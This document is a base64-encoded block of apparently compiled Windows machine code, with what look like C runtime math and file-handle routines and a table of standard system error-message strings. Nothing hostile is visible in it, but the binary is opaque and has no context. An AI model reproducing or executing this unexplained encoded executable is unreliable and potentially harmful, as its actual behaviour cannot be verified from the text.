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AAAAAAAAAAAAAAAAAAAAAAAAAALdWD1cAAAAAAgAAAGsAAACweAEAsGABAAAAAAC3Vg9XAAAAAAwAAAAUAAAAHHkBABxhAQBhZGRyZXNzIG5vdCBhdmFpbGFibGUAAABhbHJlYWR5IGNvbm5lY3RlZAAAAGFyZ3VtZW50IGxpc3QgdG9vIGxvbmcAAGFyZ3VtZW50IG91dCBvZiBkb21haW4AAGJhZCBhZGRyZXNzAGJhZCBmaWxlIGRlc2NyaXB0b3IAYmFkIG1lc3NhZ2UAYnJva2VuIHBpcGUAY29ubmVjdGlvbiBhYm9ydGVkAABjb25uZWN0aW9uIGFscmVhZHkgaW4gcHJvZ3Jlc3MAAGNvbm5lY3Rpb24gcmVmdXNlZAAAY29ubmVjdGlvbiByZXNldAAAAABkZXN0aW5hdGlvbiBhZGRyZXNzIHJlcXVpcmVkAAAAAGV4ZWN1dGFibGUgZm9ybWF0IGVycm9yAGZpbGUgdG9vIGxhcmdlAABob3N0IHVucmVhY2hhYmxlAAAAAGlkZW50aWZpZXIgcmVtb3ZlZAAAaWxsZWdhbCBieXRlIHNlcXVlbmNlAAAAaW5hcHByb3ByaWF0ZSBpbyBjb250cm9sIG9wZXJhdGlvbgAAaW52YWxpZCBzZWVrAAAAAGlzIGEgZGlyZWN0b3J5AABtZXNzYWdlIHNpemUAAAAAbmV0d29yayBkb3duAAAAAG5ldHdvcmsgcmVzZXQAAABuZXR3b3JrIHVucmVhY2hhYmxlAG5vIGJ1ZmZlciBzcGFjZQBubyBjaGlsZCBwcm9jZXNzAAAAAG5vIGxpbmsAbm8gbWVzc2FnZSBhdmFpbGFibGUAAAAAbm8gbWVzc2FnZQAAbm8gcHJvdG9jb2wgb3B0aW9uAABubyBzdHJlYW0gcmVzb3VyY2VzAG5vIHN1Y2ggZGV2aWNlIG9yIGFkZHJlc3MAAABubyBzdWNoIHByb2Nlc3MAbm90IGEgZGlyZWN0b3J5AG5vdCBhIHNvY2tldAAAAABub3QgYSBzdHJlYW0AAAAAbm90IGNvbm5lY3RlZAAAAG5vdCBzdXBwb3J0ZWQAAABvcGVyYXRpb24gaW4gcHJvZ3Jlc3MAAABvcGVyYXRpb24gbm90IHBlcm1pdHRlZABvcGVyYXRpb24gbm90IHN1cHBvcnRlZABvcGVyYXRpb24gd291bGQgYmxvY2sAAABvd25lciBkZWFkAABwcm90b2NvbCBlcnJvcgAAcHJvdG9jb2wgbm90IHN1cHBvcnRlZAAAcmVhZCBvbmx5IGZpbGUgc3lzdGVtAAAAcmVzb3VyY2UgZGVhZGxvY2sgd291bGQgb2NjdXIAAAByZXN1bHQgb3V0IG9mIHJhbmdlAHN0YXRlIG5vdCByZWNvdmVyYWJsZQAAAHN0cmVhbSB0aW1lb3V0AAB0ZXh0IGZpbGUgYnVzeQAAdGltZWQgb3V0AAAAdG9vIG1hbnkgZmlsZXMgb3BlbiBpbiBzeXN0ZW0AAAB0b28gbWFueSBsaW5rcwAAdG9vIG1hbnkgc3ltYm9saWMgbGluayBsZXZlbHMAAAB2YWx1ZSB0b28gbGFyZ2UAd3JvbmcgcHJvdG9jb2wgdHlwZQAAAAAABQAAABgrQQC3AAAALCtBABQAAAA4K0EAbwAAAEgrQQCqAAAAXCtBAI4AAABcK0EAUgAAABgrQQDzAwAAdCtBAPQDAAB0K0EA9QMAAHQrQQAQAAAAGCtBADcAAAA4K0EAZAkAAFwrQQCRAAAAgCtBAAsBAACUK0EAcAAAAKgrQQBQAAAALCtBAAIAAAC8K0EAJwAAAKgrQQAMAAAAGCtBAA8AAAA4K0EAAQAAANgrQQAGAAAAlCtBAHsAAACUK0EAIQAAAPArQQDUAAAA8CtBAIMAAACUK0EA5gMAABgrQQAIAAAABCxBABUAAAAYLEEAEQAAADgsQQBuAAAAdCtBAGEJAABcK0EA4wMAAEwsQQAOAAAABCxBAAMAAAC8K0EAHgAAAHQrQQDVBAAAGCxBABkAAAB0K0EAIAAAABgrQQAEAAAAYCxBAB0AAAB0K0EAEwAAABgrQQAdJwAAdCxBAEAnAACILEEAQScAAJgsQQA/JwAAsCxBADUnAADQLEEAGScAAPAsQQBFJwAABC1BAE0nAAAYLUEARicAACwtQQA3JwAAQC1BAB4nAABgLUEAUScAAGwtQQA0JwAAgC1BABQnAACYLUEAJicAAKQtQQBIJwAAuC1BACgnAADMLUEAOCcAAOAtQQBPJwAA8C1BAEInAAAELkEARCcAABQuQQBDJwAAJC5BAEcnAAA4LkEAOicAAEguQQBJJwAAXC5BADYnAABsLkEAPScAAHwuQQA7JwAAlC5BADknAACsLkEATCcAAMAuQQAzJwAAzC5BAAAAAAAAAAAAZgAAAOQuQQBkAAAABC9BAGUAAAC4IUEAcQAAANAhQQAHAAAA5CFBACEAAAD8IUEADgAAABQiQQAJAAAAICJBAGgAAAA0IkEAIAAAAEAiQQBqAAAATCJBAGcAAABgIkEAawAAAIAiQQBsAAAAlCJBABIAAAA4LEEAbQAAAKgiQQAQAAAAXCtBACkAAACAK0EACAAAAMgiQQARAAAALCtBABsAAADgIkEAJgAAAEgrQQAoAAAA2CtBAG4AAADwIkEAbwAAAAQjQQAqAAAAGCNBABkAAAAwI0EABAAAAJgtQQAWAAAAlCtBAB0AAABUI0EABQAAAHQrQQAVAAAAZCNBAHMAAAB0I0EAdAAAAIQjQQB1AAAAlCNBAHYAAACkI0EAdwAAALgjQQAKAAAAyCNBAHkAAADcI0EAJwAAAPArQQB4AAAA5CNBAHoAAAD8I0EAewAAAAgkQQAcAAAAqCtBAHwAAAAcJEEABgAAADAkQQATAAAAOCtBAAIAAAC8K0EAAwAAAEwkQQAUAAAAXCRBAIAAAABsJEEAfQAAAHwkQQB+AAAAjCRBAAwAAAAELEEAgQAAAJwkQQBpAAAATCxBAHAAAACsJEEAAQAAAMQkQQCCAAAA3CRBAIwAAAD0JEEAhQAAAAwlQQANAAAAGCtBAIYAAAAYJUEAhwAAACglQQAeAAAAQCVBACQAAABYJUEACwAAABgsQQAiAAAAeCVBAH8AAACMJUEAiQAAAKQlQQCLAAAAtCVBAIoAAADEJUEAFwAAANAlQQAYAAAAYCxBAB8AAADwJUEAcgAAAAAmQQCEAAAAICZBAIgAAAAwJkEAAAAAAAAAAABwZXJtaXNzaW9uIGRlbmllZAAAAGZpbGUgZXhpc3RzAG5vIHN1Y2ggZGV2aWNlAABmaWxlbmFtZSB0b28gbG9uZwAAAGRldmljZSBvciByZXNvdXJjZSBidXN5AGlvIGVycm9yAAAAAGRpcmVjdG9yeSBub3QgZW1wdHkAaW52YWxpZCBhcmd1bWVudAAAAABubyBzcGFjZSBvbiBkZXZpY2UAAG5vIHN1Y2ggZmlsZSBvciBkaXJlY3RvcnkAAABmdW5jdGlvbiBub3Qgc3VwcG9ydGVkAABubyBsb2NrIGF2YWlsYWJsZQAAAG5vdCBlbm91Z2ggbWVtb3J5AAAAcmVzb3VyY2UgdW5hdmFpbGFibGUgdHJ5IGFnYWluAABjcm9zcyBkZXZpY2UgbGluawAAAG9wZXJhdGlvbiBjYW5jZWxlZAAAdG9vIG1hbnkgZmlsZXMgb3BlbgBwZXJtaXNzaW9uX2RlbmllZAAAAGFkZHJlc3NfaW5fdXNlAABhZGRyZXNzX25vdF9hdmFpbGFibGUAAABhZGRyZXNzX2ZhbWlseV9ub3Rfc3VwcG9ydGVkAAAAAGNvbm5lY3Rpb25fYWxyZWFkeV9pbl9wcm9ncmVzcwAA